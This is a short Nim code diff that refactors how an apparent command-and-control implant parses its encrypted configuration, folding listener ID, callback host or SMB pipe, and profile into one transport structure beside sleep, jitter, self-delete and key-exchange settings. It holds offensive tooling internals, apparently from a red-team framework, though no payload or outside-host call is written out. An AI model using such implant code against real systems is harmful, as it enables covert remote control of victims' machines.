@@ -25,14 +25,15 @@ proc deserializeConfiguration(config: string): AgentCtx =
 
     # Parse decrypted profile configuration 
     unpacker = Unpacker.init(Bytes.toString(decData))
-    let 
-        listenerId = Uuid.toString(unpacker.getUint32())
-        callback = unpacker.getDataWithLengthPrefix()
-
     var agentKeyPair = generateKeyPair() 
 
     result = AgentCtx(
         agentId: generateUUID(),
+        transport: TransportSettings(
+            listenerId: Uuid.toString(unpacker.getUint32()),
+            callback: unpacker.getDataWithLengthPrefix(),
+            profile: parseString(unpacker.getDataWithLengthPrefix())
+        ),
         sleepSettings: SleepSettings(
             sleepDelay: unpacker.getUint32(),
             jitter: unpacker.getUint32(),
@@ -56,21 +57,7 @@ proc deserializeConfiguration(config: string): AgentCtx =
         selfDelete: cast[bool](unpacker.getUint8()), 
         sessionKey: deriveSessionKey(agentKeyPair, unpacker.getByteArray(Key)),
         agentPublicKey: agentKeyPair.publicKey,
-        profile: parseString(unpacker.getDataWithLengthPrefix())
     )
-
-    when defined(TRANSPORT_HTTP): 
-        result.transport = TransportSettings(
-            listenerId: listenerId,
-            hosts: callback
-        )
-
-    when defined(TRANSPORT_SMB): 
-        result.transport = TransportSettings(
-            listenerId: listenerId,
-            pipe: callback,
-            hPipe: 0 # Initialize to 0
-        )
 
     wipeKey(agentKeyPair.privateKey)
     print protect("[+] Profile configuration deserialized.")
